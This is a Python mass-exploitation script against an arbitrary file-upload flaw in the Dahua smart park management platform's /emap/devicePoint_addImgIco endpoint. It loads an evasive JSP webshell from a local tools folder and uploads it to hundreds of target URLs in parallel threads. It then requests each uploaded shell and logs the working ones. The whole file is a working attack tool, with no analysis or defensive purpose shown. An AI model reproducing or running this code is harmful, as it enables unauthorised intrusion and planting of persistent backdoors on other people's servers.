import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

with open(r'D:\BaiduNetdiskDownload\Tools\webshell\免杀webshell\ByPassBehinder\mike.jsp','r') as f:
    content=f.read()
file_content=content

def exploit(ip_, index):
    try:
        files = {
                'upload': ('a.jsp', b'mike123', 'application/octet-stream'),
            }
        url = ip_+'/emap/devicePoint_addImgIco?hasSubsystem=true'
        headers.update({ 'Content-Type':'multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT'})
        data = (
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\n"
        'Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "Content-Transfer-Encoding: binary\r\n"
        "\r\n"
        f"{file_content}\r\n"
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
        )
        # print(file_content)
        # print(index,url)
        res = requests.post(url,data=data, headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        # print(index,ip_)
        file_name=res.json()['data']
        get_ip=ip_+'/upload/emap/society_new/'+file_name
        print(index,get_ip)
        get_res=requests.get(get_ip, headers=headers, timeout=8, verify=False)
        # print(get_res)
        # print(get_res.text)
        # print(fsile_name)

        if 'Administrator' in get_res.text:
                
            with result_path.open('a+') as file:
                file.write(get_ip+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
# with open(r'D:\Downloads\tmp\dahua_file.txt', 'r') as file:
with open(r'D:\C#\VSCODE\python\POC_EXP\文件上传\大华智慧园区综合管理平台\result\大华智慧园区综合管理平台_poc.txt','r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 100
        end = start+1400

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 10
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()